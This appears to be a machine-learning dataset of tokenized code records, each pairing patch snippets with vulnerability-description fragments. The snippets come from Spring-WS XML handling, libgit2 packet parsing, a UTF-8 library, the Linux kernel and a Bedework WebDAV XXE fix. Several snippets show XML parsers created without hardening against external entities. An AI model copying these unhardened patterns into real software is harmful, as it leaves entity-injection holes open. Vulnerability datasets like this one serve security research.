"import", "org", ".", "springframework", ".", "core", ".", "io", ".", "Resource", ";", "import", "org", ".", "springframework", ".", "util", ".", "FileCopyUtils", ";", "import", "org", ".", "springframework", ".", "util", ".", "xml", ".", "StaxUtils", ";", "import", "org", ".", "springframework", ".", "xml", ".", "sax", ".", "SaxUtils", ";", "import", "org", ".", "springframework", ".", "xml", ".", "transform", ".", "StringResult", ";", "import", "static", "org", ".", "custommonkey", ".", "xmlunit", ".", "XMLAssert", ".", "assertXMLEqual", ";", "TransformerFactory", "transformerFactory", "=", "TransformerFactory", ".", "newInstance", "(", ");", "DocumentBuilderFactory", "documentBuilderFactory", "=", "DocumentBuilderFactory", ".", "newInstance", "(", ");", "XMLInputFactory", "inputFactory", "=", "XMLInputFactory", ".", "newInstance", "(", ");", "XMLInputFactory", "inputFactory", "=", "XMLInputFactory", ".", "newInstance", "(", ");", "TransformerFactory", "transformerFactory", "=", "TransformerFactory", ".", "newInstance", "(", ");", "import", "javax", ".", "xml", ".", "transform", ".", "TransformerFactory", ";", "import", "static", "org", ".", "custommonkey", ".", "xmlunit", ".", "XMLAssert", ".", "assertXMLEqual", ";", "import", "static", "org", ".", "junit", ".", "Assert", ".", "assertEquals", ";", "final", "Transformer", "transformer", "=", "TransformerFactory", ".", "newInstance", "(", ").", "newTransformer", "(", ");", "final", "Transformer", "transformer", "=", "TransformerFactory", ".", "newInstance", "(", ").", "newTransformer", "(", ");", "import", "javax", ".", "xml", ".", "transform", ".", "TransformerFactory", ";", "import", "static", "org", ".", "custommonkey", ".", "xmlunit", ".", "XMLAssert", ".", "assertXMLEqual", ";", "import", "static", "org", ".", "junit", ".", "Assert", ".", "assertEquals", ";", "final", "Transformer", "transformer", "=", "TransformerFactory", ".", "newInstance", "(", ").", "newTransformer", "(", ");", "final", "Transformer", "transformer", "=", "TransformerFactory", ".", "newInstance", "(", ").", "newTransformer", "(", ");", "import", "static", "org", ".", "custommonkey", ".", "xmlunit", ".", "XMLAssert", ".", "assertXMLEqual", ";", "documentBuilderFactory", "=", "DocumentBuilderFactory", ".", "newInstance", "(", ");", "transformerFactory", "=", "TransformerFactory", ".", "newInstance", "(", ");", "import", "javax", ".", "xml", ".", "transform", ".", "TransformerFactory", ";", "transformer", "=", "TransformerFactory", ".", "newInstance", "(", ").", "newTransformer", "(", ");", "import", "org", ".", "springframework", ".", "xml", ".", "transform", ".", "StringResult", ";", "import", "org", ".", "springframework", ".", "xml", ".", "transform", ".", "StringSource", ";", "import", "static", "org", ".", "custommonkey", ".", "xmlunit", ".", "XMLAssert", ".", "assertXMLEqual", ";", "DocumentBuilderFactory", "documentBuilderFactory", "=", "DocumentBuilderFactory", ".", "newInstance", "(", ");", "TransformerFactory", "transformerFactory", "=", "TransformerFactory", ".", "newInstance", "(", ");", "import", "org", ".", "springframework", ".", "util", ".", "xml", ".", "StaxUtils", ";", "DocumentBuilderFactory", "documentBuilderFactory", "=", "DocumentBuilderFactory", ".", "newInstance", "(", ");", "XMLInputFactory", "inputFactory", "=", "XMLInputFactory", ".", "newInstance", "(", ");", "XMLInputFactory", "inputFactory", "=", "XMLInputFactory", ".", "newInstance", "(", ");", "import", "javax", ".", "xml", ".", "transform", ".", "TransformerFactory", ";", "import", "org", ".", "springframework", ".", "xml", ".", "transform", ".", "StringResult", ";", "import", "org", ".", "springframework", ".", "xml", ".", "transform", ".", "StringSource", ";", "import", "static", "org", ".", "custommonkey", ".", "xmlunit", ".", "XMLAssert", ".", "assertXMLEqual", ";", "transformer", "=", "TransformerFactory", ".", "newInstance", "(", ").", "newTransformer", "(", ");", "import", "javax", ".", "xml", ".", "transform", ".", "TransformerFactory", ";", "import", "static", "org", ".", "custommonkey", ".", "xmlunit", ".", "XMLAssert", ".", "assertXMLEqual", ";", "import", "static", "org", ".", "easymock", ".", "EasyMock", ".", "*;", "import", "static", "org", ".", "junit", ".", "Assert", ".", "fail", ";", "transformer", "=", "TransformerFactory", ".", "newInstance", "(", ").", "newTransformer", "(", ");", "import", "javax", ".", "xml", ".", "transform", ".", "TransformerFactory", ";", "import", "org", ".", "apache", ".", "axiom", ".", "om", ".", "OMAbstractFactory", ";", "import", "org", ".", "apache", ".", "axiom", ".", "soap", ".", "SOAPFactory", ";", "import", "org", ".", "junit", ".", "Test", ";", "import", "static", "org", ".", "custommonkey", ".", "xmlunit", ".", "XMLAssert", ".", "assertXMLEqual", ";", "import", "static", "org", ".", "junit", ".", "Assert", ".", "*;", "Transformer", "transformer", "=", "TransformerFactory", ".", "newInstance", "(", ").", "newTransformer", "(", ");", "Transformer", "transformer", "=", "TransformerFactory", ".", "newInstance", "(", ").", "newTransformer", "(", ");", "Transformer", "transformer", "=", "TransformerFactory", ".", "newInstance", "(", ").", "newTransformer", "(", ");", "Transformer", "transformer", "=", "TransformerFactory", ".", "newInstance", "(", ").", "newTransformer", "(", ");", "Transformer", "transformer", "=", "TransformerFactory", ".", "newInstance", "(", ").", "newTransformer", "(", ");", "import", "javax", ".", "xml", ".", "transform", ".", "TransformerFactory", ";", "import", "org", ".", "junit", ".", "Assert", ";", "import", "org", ".", "junit", ".", "Before", ";", "import", "org", ".", "junit", ".", "Test", ";", "import", "static", "org", ".", "custommonkey", ".", "xmlunit", ".", "XMLAssert", ".", "assertXMLEqual", ";", "final", "Transformer", "transformer", "=", "TransformerFactory", ".", "newInstance", "(", ").", "newTransformer", "(", ");", "DocumentBuilderFactory", "documentBuilderFactory", "=", "DocumentBuilderFactory", ".", "newInstance", "(", ");", "import", "org", ".", "w3c", ".", "dom", ".", "Document", ";", "import", "org", ".", "w3c", ".", "dom", ".", "Element", ";", "import", "static", "org", ".", "junit", ".", "Assert", ".", "assertEquals", ";", "import", "static", "org", ".", "junit", ".", "Assert", ".", "assertTrue", ";", "DocumentBuilderFactory", "documentBuilderFactory", "=", "DocumentBuilderFactory", ".", "newInstance", "(", ");", "import", "javax", ".", "xml", ".", "transform", ".", "TransformerFactory", ";", "Transformer", "transformer", "=", "TransformerFactory", ".", "newInstance", "(", ").", "newTransformer", "(", ");", "import", "javax", ".", "xml", ".", "transform", ".", "TransformerFactory", ";", "Transformer", "transformer", "=", "TransformerFactory", ".", "newInstance", "(", ").", "newTransformer", "(", ");", "import", "static", "org", ".", "custommonkey", ".", "xmlunit", ".", "XMLAssert", ".", "assertXMLEqual", ";", "TransformerFactory", "transformerFactory", "=", "TransformerFactory", ".", "newInstance", "(", ");", "import", "javax", ".", "xml", ".", "transform", ".", "TransformerFactory", ";", "import", "org", ".", "springframework", ".", "util", ".", "xml", ".", "StaxUtils", ";", "DocumentBuilderFactory", "factory", "=", "DocumentBuilderFactory", ".", "newInstance", "(", ");", "QName", "qName", "=", "PayloadRootUtils", ".", "getPayloadRootQName", "(", "source", ",", "TransformerFactory", ".", "newInstance", "(", "))", ";", "XMLInputFactory", "inputFactory", "=", "XMLInputFactory", ".", "newInstance", "(", ");", "QName", "qName", "=", "PayloadRootUtils", ".", "getPayloadRootQName", "(", "source", ",", "TransformerFactory", ".", "newInstance", "(", "))", ";", "XMLInputFactory", "inputFactory", "=", "XMLInputFactory", ".", "newInstance", "(", ");", "QName", "qName", "=", "PayloadRootUtils", ".", "getPayloadRootQName", "(", "source", ",", "TransformerFactory", ".", "newInstance", "(", "))", ";", "QName", "qName", "=", "PayloadRootUtils", ".", "getPayloadRootQName", "(", "source", ",", "TransformerFactory", ".", "newInstance", "(", "))", ";", "QName", "qName", "=", "PayloadRootUtils", ".", "getPayloadRootQName", "(", "source", ",", "TransformerFactory", ".", "newInstance", "(", "))", ";", "QName", "qName", "=", "PayloadRootUtils", ".", "getPayloadRootQName", "(", "null", ",", "TransformerFactory", ".", "newInstance", "(", "))", ";", "TransformerFactory", "transformerFactory", "=", "TransformerFactory", ".", "newInstance", "(", ");", "import", "javax", ".", "xml", ".", "transform", ".", "TransformerFactory", ";", "import", "org", ".", "custommonkey", ".", "xmlunit", ".", "XMLAssert", ";", "import", "org", ".", "custommonkey", ".", "xmlunit", ".", "XMLUnit", ";", "import", "org", ".", "junit", ".", "Test", ";", "import", "static", "org", ".", "junit", ".", "Assert", ".", "assertEquals", ";", "import", "static", "org", ".", "junit", ".", "Assert", ".", "fail", ";", "transformer", "=", "TransformerFactory", ".", "newInstance", "(", ").", "newTransformer", "(", ");", "import", "org", ".", "springframework", ".", "core", ".", "io", ".", "ClassPathResource", ";", "import", "org", ".", "springframework", ".", "core", ".", "io", ".", "Resource", ";", "import", "org", ".", "springframework", ".", "util", ".", "FileCopyUtils", ";", "import", "org", ".", "springframework", ".", "xml", ".", "sax", ".", "SaxUtils", ";", "import", "static", "org", ".", "custommonkey", ".", "xmlunit", ".", "XMLAssert", ".", "assertXMLEqual", ";", "DocumentBuilderFactory", "documentBuilderFactory", "=", "DocumentBuilderFactory", ".", "newInstance", "(", ");", "DocumentBuilderFactory", "documentBuilderFactory", "=", "DocumentBuilderFactory", ".", "newInstance", "(", ");", "import", "javax", ".", "xml", ".", "transform", ".", "TransformerFactory", ";", "import", "org", ".", "springframework", ".", "xml", ".", "transform", ".", "StringSource", ";", "transformer", "=", "TransformerFactory", ".", "newInstance", "(", ").", "newTransformer", "(", ");", "import", "org", ".", "springframework", ".", "core", ".", "io", ".", "ClassPathResource", ";", "import", "org", ".", "springframework", ".", "core", ".", "io", ".", "Resource", ";", "import", "org", ".", "springframework", ".", "util", ".", "StringUtils", ";", "import", "static", "org", ".", "custommonkey", ".", "xmlunit", ".", "XMLAssert", ".", "assertXMLEqual", ";", "DocumentBuilderFactory", "factory", "=", "DocumentBuilderFactory", ".", "newInstance", "(", ");", "import", "javax", ".", "xml", ".", "transform", ".", "TransformerFactory", ";", "import", "static", "org", ".", "custommonkey", ".", "xmlunit", ".", "XMLAssert", ".", "assertXMLEqual", ";", "transformer", "=", "TransformerFactory", ".", "newInstance", "(", ").", "newTransformer", "(", ");", "transformer", "=", "TransformerFactory", ".", "newInstance", "(", ").", "newTransformer", "(", ");", "DocumentBuilderFactory", "documentBuilderFactory", "=", "DocumentBuilderFactory", ".", "newInstance", "(", ");", "DocumentBuilderFactory", "documentBuilderFactory", "=", "DocumentBuilderFactory", ".", "newInstance", "(", ");", "transformerFactory", "=", "TransformerFactory", ".", "newInstance", "(", ");", "import", "static", "org", ".", "custommonkey", ".", "xmlunit", ".", "XMLAssert", ".", "assertXMLEqual", ";", "import", "static", "org", ".", "junit", ".", "Assert", ".", "assertEquals", ";", "transformerFactory", "=", "TransformerFactory", ".", "newInstance", "(", ");", "import", "org", ".", "springframework", ".", "core", ".", "io", ".", "ClassPathResource", ";", "import", "org", ".", "springframework", ".", "core", ".", "io", ".", "Resource", ";", "import", "org", ".", "springframework", ".", "xml", ".", "transform", ".", "ResourceSource", ";", "DocumentBuilderFactory", "documentBuilderFactory", "=", "DocumentBuilderFactory", ".", "newInstance", "(", ");", "DocumentBuilderFactory", "documentBuilderFactory", "=", "DocumentBuilderFactory", ".", "newInstance", "(", ");", "import", "org", ".", "junit", ".", "Assert", ";", "import", "org", ".", "junit", ".", "Before", ";", "import", "org", ".", "junit", ".", "Test", ";", "import", "org", ".", "w3c", ".", "dom", ".", "Document", ";", "import", "static", "org", ".", "custommonkey", ".", "xmlunit", ".", "XMLAssert", ".", "assertXMLEqual", ";", "DocumentBuilderFactory", "documentBuilderFactory", "=", "DocumentBuilderFactory", ".", "newInstance", "(", ");", "DocumentBuilderFactory", "documentBuilderFactory", "=", "DocumentBuilderFactory", ".", "newInstance", "(", ");", "DocumentBuilderFactory", "documentBuilderFactory", "=", "DocumentBuilderFactory", ".", "newInstance", "(", ");", "import", "org", ".", "junit", ".", "Before", ";", "import", "org", ".", "junit", ".", "Test", ";", "import", "org", ".", "w3c", ".", "dom", ".", "Document", ";", "import", "static", "org", ".", "custommonkey", ".", "xmlunit", ".", "XMLAssert", ".", "assertXMLEqual", ";", "DocumentBuilderFactory", "documentBuilderFactory", "=", "DocumentBuilderFactory", ".", "newInstance", "(", ");", "import", "org", ".", "springframework", ".", "core", ".", "io", ".", "ClassPathResource", ";", "import", "org", ".", "springframework", ".", "core", ".", "io", ".", "Resource", ";", "import", "org", ".", "springframework", ".", "xml", ".", "xsd", ".", "SimpleXsdSchema", ";", "import", "org", ".", "springframework", ".", "xml", ".", "xsd", ".", "commons", ".", "CommonsXsdSchemaCollection", ";", "import", "static", "org", ".", "custommonkey", ".", "xmlunit", ".", "XMLAssert", ".", "assertXMLEqual", ";", "TransformerFactory", "transformerFactory", "=", "TransformerFactory", ".", "newInstance", "(", ");", "DocumentBuilderFactory", "documentBuilderFactory", "=", "DocumentBuilderFactory", ".", "newInstance", "(", ");", "import", "javax", ".", "xml", ".", "transform", ".", "TransformerFactory", ";", "import", "static", "org", ".", "custommonkey", ".", "xmlunit", ".", "XMLAssert", ".", "assertXMLEqual", ";", "transformer", "=", "TransformerFactory", ".", "newInstance", "(", ").", "newTransformer", "(", ");", "DocumentBuilderFactory", "documentBuilderFactory", "=", "DocumentBuilderFactory", ".", "newInstance", "(", ");", "import", "org", ".", "springframework", ".", "core", ".", "io", ".", "ClassPathResource", ";", "import", "org", ".", "springframework", ".", "core", ".", "io", ".", "Resource", ";", "import", "org", ".", "springframework", ".", "xml", ".", "sax", ".", "SaxUtils", ";", "DocumentBuilderFactory", "documentBuilderFactory", "=", "DocumentBuilderFactory", ".", "newInstance", "(", ");", "import", "org", ".", "springframework", ".", "core", ".", "io", ".", "ClassPathResource", ";", "import", "org", ".", "springframework", ".", "core", ".", "io", ".", "Resource", ";", "import", "org", ".", "springframework", ".", "xml", ".", "sax", ".", "SaxUtils", ";", "DocumentBuilderFactory", "documentBuilderFactory", "=", "DocumentBuilderFactory", ".", "newInstance", "(", ");", "import", "javax", ".", "xml", ".", "transform", ".", "TransformerFactory", ";", "import", "org", ".", "junit", ".", "Test", ";", "import", "static", "org", ".", "junit", ".", "Assert", ".", "assertTrue", ";", "Transformer", "transformer", "=", "TransformerFactory", ".", "newInstance", "(", ").", "newTransformer", "(", ");", "*", "<", "p", ">", "Only", "distinguishes", "between", "JAXP", "1", ".", "0", ",", "1", ".", "1", ",", "1", ".", "3", ",", "and", "1", ".", "4", ",", "since", "JAXP", "1", ".", "2", "was", "a", "maintenance", "release", "with", "no", "new", "*", "<", "p", ">", "Note", "that", "Spring", "-", "WS", "requires", "JDK", "1", ".", "5", "as", "of", "Spring", "-", "WS", "2", ".", "0", ",", "and", "therefore", "has", "at", "least", "JAXP", "1", ".", "3", "available", ".", "*", "ClassUtils", ".", "forName", "(", "JAXP_14_CLASS_NAME", ",", "classLoader", ")", ";", "jaxpVersion", "=", "JAXP_14", ";", "}", "catch", "(", "ClassNotFoundException", "ex", ")", "{", "/", "/", "leave", "1", ".", "3", "as", "default", "(", "it", "'", "s", "either", "1", ".", "3", "or", "unknown", ")", "jaxpVersion", "=", "JAXP_13", ";", "import", "javax", ".", "xml", ".", "transform", ".", "TransformerFactoryConfigurationError", ";", "try", "{", "return", "transformerFactoryClass", ".", "newInstance", "(", ");", "}", "catch", "(", "Exception", "ex", ")", "{", "throw", "new", "TransformerFactoryConfigurationError", "(", "ex", ",", "\"", "Could", "not", "instantiate", "TransformerFactory", "[", "\"", "+", "transformerFactoryClass", "+", "\"", "]\"", ");", "}", "}", "else", "{", "return", "TransformerFactory", ".", "newInstance", "(", ");", "import", "org", ".", "xml", ".", "sax", ".", "SAXException", ";", "import", "org", ".", "xml", ".", "sax", ".", "XMLReader", ";", "import", "org", ".", "xml", ".", "sax", ".", "helpers", ".", "XMLReaderFactory", ";", "XMLReader", "xmlReader", "=", "XMLReaderFactory", ".", "createXMLReader", "(", ");", "SchemaFactory", "schemaFactory", "=", "SchemaFactory", ".", "newInstance", "(", "schemaLanguage", ")", ";", "import", "org", ".", "apache", ".", "commons", ".", "logging", ".", "Log", ";", "import", "org", ".", "apache", ".", "commons", ".", "logging", ".", "LogFactory", ";", "if", "(", "JaxpVersion", ".", "getJaxpVersion", "(", ")", ">", "=", "JaxpVersion", ".", "JAXP_13", ")", "{", "private", "static", "DocumentBuilderFactory", "documentBuilderFactory", "=", "DocumentBuilderFactory", ".", "newInstance", "(", ");", "DocumentBuilderFactory", "documentBuilderFactory", "=", "DocumentBuilderFactory", ".", "newInstance", "(", ");", "import", "org", ".", "springframework", ".", "util", ".", "StringUtils", ";", "DocumentBuilderFactory", "factory", "=", "DocumentBuilderFactory", ".", "newInstance", "(", ");", "DocumentBuilderFactory", "factory", "=", "DocumentBuilderFactory", ".", "newInstance", "(", ");", "DocumentBuilderFactory", "factory", "=", "DocumentBuilderFactory", ".", "newInstance", "(", ");", "import", "javax", ".", "xml", ".", "transform", ".", "TransformerFactory", ";", "import", "org", ".", "springframework", ".", "core", ".", "io", ".", "ClassPathResource", ";", "Transformer", "transformer", "=", "TransformerFactory", ".", "newInstance", "(", ").", "newTransformer", "(", ");", "import", "javax", ".", "xml", ".", "parsers", ".", "DocumentBuilderFactory", ";", "import", "javax", ".", "xml", ".", "transform", ".", "TransformerFactory", ";", "import", "static", "org", ".", "custommonkey", ".", "xmlunit", ".", "XMLAssert", ".", "assertXMLEqual", ";", "Document", "document", "=", "DocumentBuilderFactory", ".", "newInstance", "(", ").", "newDocumentBuilder", "(", ").", "newDocument", "(", ");", "Transformer", "transformer", "=", "TransformerFactory", ".", "newInstance", "(", ").", "newTransformer", "(", ");", "Transformer", "transformer", "=", "TransformerFactory", ".", "newInstance", "(", ").", "newTransformer", "(", ");", "import", "org", ".", "springframework", ".", "util", ".", "xml", ".", "StaxUtils", ";", "DocumentBuilderFactory", "documentBuilderFactory", "=", "DocumentBuilderFactory", ".", "newInstance", "(", ");", "DocumentBuilderFactory", "documentBuilderFactory", "=", "DocumentBuilderFactory", ".", "newInstance", "(", ");", "DocumentBuilderFactory", "documentBuilderFactory", "=", "DocumentBuilderFactory", ".", "newInstance", "(", ");", "XMLInputFactory", "inputFactory", "=", "XMLInputFactory", ".", "newInstance", "(", ");", "XMLInputFactory", "inputFactory", "=", "XMLInputFactory", ".", "newInstance", "(", ");", "import", "org", ".", "springframework", ".", "core", ".", "io", ".", "ClassPathResource", ";", "import", "org", ".", "springframework", ".", "core", ".", "io", ".", "Resource", ";", "import", "org", ".", "springframework", ".", "xml", ".", "transform", ".", "ResourceSource", ";", "DocumentBuilderFactory", "documentBuilderFactory", "=", "DocumentBuilderFactory", ".", "newInstance", "(", ");", "DocumentBuilderFactory", "documentBuilderFactory", "=", "DocumentBuilderFactory", ".", "newInstance", "(", ");", "DocumentBuilderFactory", "documentBuilderFactory", "=", "DocumentBuilderFactory", ".", "newInstance", "(", ");", "DocumentBuilderFactory", "documentBuilderFactory", "=", "DocumentBuilderFactory", ".", "newInstance", "(", ");", "import", "org", ".", "springframework", ".", "core", ".", "io", ".", "ClassPathResource", ";", "import", "org", ".", "springframework", ".", "core", ".", "io", ".", "Resource", ";", "import", "org", ".", "springframework", ".", "xml", ".", "sax", ".", "SaxUtils", ";", "import", "org", ".", "springframework", ".", "xml", ".", "validation", ".", "XmlValidator", ";", "import", "static", "org", ".", "custommonkey", ".", "xmlunit", ".", "XMLAssert", ".", "assertXMLEqual", ";", "DocumentBuilderFactory", "documentBuilderFactory", "=", "DocumentBuilderFactory", ".", "newInstance", "(", ");", "TransformerFactory", "transformerFactory", "=", "TransformerFactory", ".", "newInstance", "(", ");", "import", "org", ".", "custommonkey", ".", "xmlunit", ".", "XMLUnit", ";", "import", "org", ".", "junit", ".", "Assert", ";", "import", "org", ".", "junit", ".", "Before", ";", "import", "org", ".", "junit", ".", "Test", ";", "import", "org", ".", "w3c", ".", "dom", ".", "Document", ";", "import", "static", "org", ".", "custommonkey", ".", "xmlunit", ".", "XMLAssert", ".", "assertXMLEqual", ";", "TransformerFactory", "transformerFactory", "=", "TransformerFactory", ".", "newInstance", "(", ");", "DocumentBuilderFactory", "documentBuilderFactory", "=", "DocumentBuilderFactory", ".", "newInstance", "(", ");"], "docstring_tokens": ["persuading", "a", "victim", "to", "open", "a", "specially-crafted", "file"]}
{"contents": ["empty"], "code_tokens": ["*", "The", "Git", "protocol", "does", "not", "specify", "empty", "lines", "as", "part", "*", "of", "the", "protocol", ".", "Not", "knowing", "what", "to", "do", "with", "an", "empty", "*", "line", ",", "we", "should", "return", "an", "error", "upon", "hitting", "one", ".", "giterr_set_str", "(", "GITERR_NET", ",", "\"", "Invalid", "empty", "packet", "\"", ");", "return", "GIT_ERROR", ";</s>*", "TODO", ":", "How", "do", "we", "deal", "with", "empty", "lines", "?", "Try", "again", "?", "with", "the", "next", "*", "line", "?", "*", "head", "=", "NULL", ";", "*", "out", "=", "line", ";", "return", "0", ";", "/", "*", "When", "a", "valid", "packet", "with", "no", "content", "has", "been", "*", "read", ",", "git_pkt_parse_line", "does", "not", "report", "an", "*", "error", ",", "but", "the", "pkt", "pointer", "has", "not", "been", "set", ".", "*", "Handle", "this", "by", "skipping", "over", "empty", "packets", ".", "*", "/", "if", "(", "pkt", "=", "=", "NULL", ")", "continue", ";", "if", "(", "pkt", "=", "=", "NULL", ")", "continue", ";"], "docstring_tokens": ["via", "an", "empty", "packet", "line", "."]}
{"contents": ["empty"], "code_tokens": ["/", "/", "Copyright", "2006", "-", "2016", "Nemanja", "Trifunovic", "invalid_code_point", "(", "uint32_t", "codepoint", ")", ":", "cp", "(", "codepoint", ")", "{", "}", "out", "=", "utf8", ":", ":", "append", "(", "replacement", ",", "out", ")", ";", "start", "=", "end", ";", "break", ";", "+", "+", "start", ";", "void", "retreat", "(", "octet_iterator", "&", "it", ",", "distance_type", "n", ",", "octet_iterator", "end", ")", "utf8", ":", ":", "prior", "(", "it", ",", "end", ")", ";", "while", "(", "start", "<", "end", ")", "{", "while", "(", "start", "<", "end", ")", "const", "octet_iterator", "&", "rangestart", ",", "const", "octet_iterator", "&", "rangeend", ")", ":", "it", "(", "octet_it", ")", ",", "range_start", "(", "rangestart", ")", ",", "range_end", "(", "rangeend", ")", "if", "(", "it", "=", "=", "end", ")", "return", "NOT_ENOUGH_ROOM", ";</s>/", "/", "Copyright", "2006", "Nemanja", "Trifunovic", "invalid_code_point", "(", "uint32_t", "cp", ")", ":", "cp", "(", "cp", ")", "{", "}", "throw", "not_enough_room", "(", ");", "void", "retreat", "(", "octet_iterator", "&", "it", ",", "distance_type", "n", ",", "octet_iterator", "start", ")", "utf8", ":", ":", "prior", "(", "it", ",", "start", ")", ";", "while", "(", "start", "!", "=", "end", ")", "{", "while", "(", "start", "!", "=", "end", ")", "const", "octet_iterator", "&", "range_start", ",", "const", "octet_iterator", "&", "range_end", ")", ":", "it", "(", "octet_it", ")", ",", "range_start", "(", "range_start", ")", ",", "range_end", "(", "range_end", ")"], "docstring_tokens": ["persuading", "a", "victim", "to", "open", "a", "specially-crafted", "file"]}
{"contents": ["empty"], "code_tokens": ["inet_sk", "(", "newsk", ")", "->", "mc_list", "=", "NULL", ";</s>"], "docstring_tokens": ["by", "leveraging", "use", "of", "the", "accept", "system", "call", "."]}
{"contents": ["empty"], "code_tokens": ["<", "sourceFolder", "url", "=", "\"", "file", ":", "//", "$", "MODULE_DIR", "$", "/", "src", "/", "test", "/", "java", "\"", "isTestSource", "=", "\"", "true", "\"", "/", ">", "<", "sourceFolder", "url", "=", "\"", "file", ":", "//", "$", "MODULE_DIR", "$", "/", "src", "/", "test", "/", "resources", "\"", "type", "=", "\"", "java", "-", "test", "-", "resource", "\"", "/", ">", "<", "orderEntry", "type", "=", "\"", "library", "\"", "scope", "=", "\"", "TEST", "\"", "name", "=", "\"", "Maven", ":", "junit", ":", "junit", ":", "4", ".", "12", "\"", "level", "=", "\"", "project", "\"", "/", ">", "<", "orderEntry", "type", "=", "\"", "library", "\"", "scope", "=", "\"", "TEST", "\"", "name", "=", "\"", "Maven", ":", "org", ".", "hamcrest", ":", "hamcrest", "-", "core", ":", "1", ".", "3", "\"", "level", "=", "\"", "project", "\"", "/", ">", "<", "orderEntry", "type", "=", "\"", "library", "\"", "scope", "=", "\"", "TEST", "\"", "name", "=", "\"", "Maven", ":", "org", ".", "mockito", ":", "mockito", "-", "core", ":", "1", ".", "10", ".", "19", "\"", "level", "=", "\"", "project", "\"", "/", ">", "<", "orderEntry", "type", "=", "\"", "library", "\"", "scope", "=", "\"", "TEST", "\"", "name", "=", "\"", "Maven", ":", "org", ".", "objenesis", ":", "objenesis", ":", "2", ".", "1", "\"", "level", "=", "\"", "project", "\"", "/", ">", "mvn_version", "=", "3", ".", "5", ".", "4", "@", "@", "-", "85", ",", "6", "+", "85", ",", "18", "@", "@", "<", "dependency", ">", "<", "groupId", ">", "junit", "<", "/", "groupId", ">", "<", "artifactId", ">", "junit", "<", "/", "artifactId", ">", "<", "version", ">", "4", ".", "12", "<", "/", "version", ">", "<", "scope", ">", "test", "<", "/", "scope", ">", "<", "/", "dependency", ">", "<", "dependency", ">", "<", "groupId", ">", "org", ".", "mockito", "<", "/", "groupId", ">", "<", "artifactId", ">", "mockito", "-", "core", "<", "/", "artifactId", ">", "<", "version", ">", "1", ".", "10", ".", "19", "<", "/", "version", ">", "<", "scope", ">", "test", "<", "/", "scope", ">", "<", "/", "dependency", ">", "public", "abstract", "class", "MethodBase", "extends", "Logged", "implements", "SecureXml", "{", "*", "@", "param", "contentLength", "Content", "length", "*", "@", "param", "reader", "Reader", "protected", "Document", "parseContent", "(", "final", "int", "contentLength", ",", "final", "Reader", "reader", ")", "throws", "WebdavException", "{", "return", "parseXmlSafely", "(", "contentLength", ",", "reader", ")", ";", "public", "class", "PostRequestPars", "implements", "SecureXml", "{", "xmlDoc", "=", "parseXmlSafely", "(", "req", ".", "getContentLength", "(", "),", "reqRdr", ")", ";", "package", "org", ".", "bedework", ".", "webdav", ".", "servlet", ".", "common", ";", "import", "org", ".", "bedework", ".", "webdav", ".", "servlet", ".", "shared", ".", "WebdavBadRequest", ";", "import", "org", ".", "bedework", ".", "webdav", ".", "servlet", ".", "shared", ".", "WebdavException", ";", "import", "org", ".", "w3c", ".", "dom", ".", "Document", ";", "import", "org", ".", "xml", ".", "sax", ".", "InputSource", ";", "import", "org", ".", "xml", ".", "sax", ".", "SAXException", ";", "import", "javax", ".", "xml", ".", "parsers", ".", "DocumentBuilder", ";", "import", "javax", ".", "xml", ".", "parsers", ".", "DocumentBuilderFactory", ";", "import", "java", ".", "io", ".", "Reader", ";", "public", "interface", "SecureXml", "{", "default", "Document", "parseXmlSafely", "(", "final", "int", "contentLength", ",", "final", "Reader", "reader", ")", "throws", "WebdavException", "{", "if", "(", "contentLength", "=", "=", "0", ")", "{", "return", "null", ";", "}", "if", "(", "reader", "=", "=", "null", ")", "{", "/", "/", "No", "content", "?", "return", "null", ";", "}", "try", "{", "DocumentBuilderFactory", "factory", "=", "DocumentBuilderFactory", ".", "newInstance", "(", ");", "factory", ".", "setNamespaceAware", "(", "false", ")", ";", "factory", ".", "setFeature", "(", "\"", "http", ":", "//", "javax", ".", "xml", ".", "XMLConstants", "/", "feature", "/", "secure", "-", "processing", "\"", ",", "true", ")", ";", "factory", ".", "setFeature", "(", "\"", "http", ":", "//", "xml", ".", "org", "/", "sax", "/", "features", "/", "external", "-", "general", "-", "entities", "\"", ",", "false", ")", ";", "factory", ".", "setFeature", "(", "\"", "http", ":", "//", "xml", ".", "org", "/", "sax", "/", "features", "/", "external", "-", "parameter", "-", "entities", "\"", ",", "false", ")", ";", "factory", ".", "setAttribute", "(", "\"", "http", ":", "//", "apache", ".", "org", "/", "xml", "/", "features", "/", "nonvalidating", "/", "load", "-", "external", "-", "dtd", "\"", ",", "false", ")", ";", "DocumentBuilder", "builder", "=", "factory", ".", "newDocumentBuilder", "(", ");", "return", "builder", ".", "parse", "(", "new", "InputSource", "(", "reader", ")", ");", "}", "catch", "(", "SAXException", "exception", ")", "{", "throw", "new", "WebdavBadRequest", "(", "exception", ".", "getMessage", "(", "))", ";", "}", "catch", "(", "Throwable", "t", ")", "{", "throw", "new", "WebdavException", "(", "t", ")", ";", "}", "}", "}", "@", "@", "-", "0", ",", "0", "+", "1", ",", "68", "@", "@", "package", "org", ".", "bedework", ".", "webdav", ".", "servlet", ".", "common", ";", "import", "org", ".", "bedework", ".", "webdav", ".", "servlet", ".", "shared", ".", "WebdavException", ";", "import", "org", ".", "bedework", ".", "webdav", ".", "servlet", ".", "shared", ".", "WebdavNsIntf", ";", "import", "org", ".", "junit", ".", "Before", ";", "import", "org", ".", "junit", ".", "Rule", ";", "import", "org", ".", "junit", ".", "Test", ";", "import", "org", ".", "mockito", ".", "Answers", ";", "import", "org", ".", "mockito", ".", "Mock", ";", "import", "org", ".", "mockito", ".", "junit", ".", "MockitoJUnit", ";", "import", "org", ".", "mockito", ".", "junit", ".", "MockitoRule", ";", "import", "javax", ".", "servlet", ".", "http", ".", "HttpServletRequest", ";", "import", "javax", ".", "servlet", ".", "http", ".", "HttpServletResponse", ";", "import", "java", ".", "io", ".", "BufferedReader", ";", "import", "java", ".", "io", ".", "IOException", ";", "import", "java", ".", "io", ".", "InputStreamReader", ";", "import", "java", ".", "util", ".", "UUID", ";", "import", "static", "org", ".", "junit", ".", "Assert", ".", "assertNotNull", ";", "import", "static", "org", ".", "junit", ".", "Assert", ".", "assertTrue", ";", "import", "static", "org", ".", "mockito", ".", "Mockito", ".", "when", ";", "public", "class", "TestSecureXmlTypes", "{", "@", "Rule", "public", "MockitoRule", "mockitoRule", "=", "MockitoJUnit", ".", "rule", "(", ");", "@", "Mock", "private", "HttpServletRequest", "request", ";", "@", "Mock", "private", "HttpServletResponse", "response", ";", "@", "Mock", "(", "answer", "=", "Answers", ".", "CALLS_REAL_METHODS", ")", "private", "WebdavNsIntf", "webdavNsIntf", ";", "@", "Mock", "(", "answer", "=", "Answers", 